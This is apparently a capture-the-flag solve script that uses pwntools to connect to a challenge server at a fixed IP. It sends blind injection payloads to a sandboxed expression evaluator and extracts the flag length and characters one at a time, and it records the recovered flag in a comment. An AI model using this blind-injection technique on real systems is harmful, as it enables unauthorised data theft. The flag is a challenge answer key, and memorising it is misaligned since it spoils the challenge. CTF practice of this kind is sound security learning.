import re
import sys

import proofofwork
from pwnlib.tubes.remote import remote

PY2 = sys.version_info[0] < 3


def new_connection():
    return remote('34.92.121.149', 54321)


def solve_pow(conn):
    prefix = re.findall(r'hashlib\.sha1\(input\)\.hexdigest\(\) == "([0-9a-f]{4})"', conn.recvline().decode())[0]

    if PY2:
        prefix = prefix.encode()

    conn.sendlineafter(b'> ', proofofwork.sha1(prefix))


def get_flag_length():
    for flag_length in range(100):
        conn = new_connection()
        solve_pow(conn)
        conn.sendlineafter(b'$ ', b'[sorted][0]if[]in[session[args[0]][%d]]else[sorted][0]114514log' % flag_length)
        result = conn.recvline().strip().decode()
        print('%d -> %s' % (flag_length, result))

        if result == 'exception':
            break

        conn.close()

    return flag_length


def get_flag_char(pos):
    print('Blind pos %d' % pos)

    for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]':
        event_pos = (58 if c == ']' else 57) + len(str(pos))
        event_char = c if c not in '[]' else '[]'
        conn = new_connection()
        solve_pow(conn)
        conn.sendlineafter(b'$ ', b'[sorted][0]if[session[args[0]][%d]][0]in[event[%d]][0]else[%s][0]114514log' % (pos, event_pos, event_char))
        result = conn.recvline().strip().decode()
        # print('%c -> %s' % (c, result))

        if result == "['log']":
            return c

        conn.close()


def get_flag(length):
    partial_flag = ''
    skip = len(partial_flag)

    for pos in range(5 + skip, length - 1):
        partial_flag += get_flag_char(pos)
        print('Partial flag: %s' % partial_flag)

    return '*ctf{%s}' % partial_flag


# print(get_flag_length())  # 75
print(get_flag(75))  # *ctf{JtWCBuYlVN75pb]y8zhJem9GAH1YsUqgMEvQn_P2wd0IDRTaHjZ3i6SQXrxKkL4[FfocO}
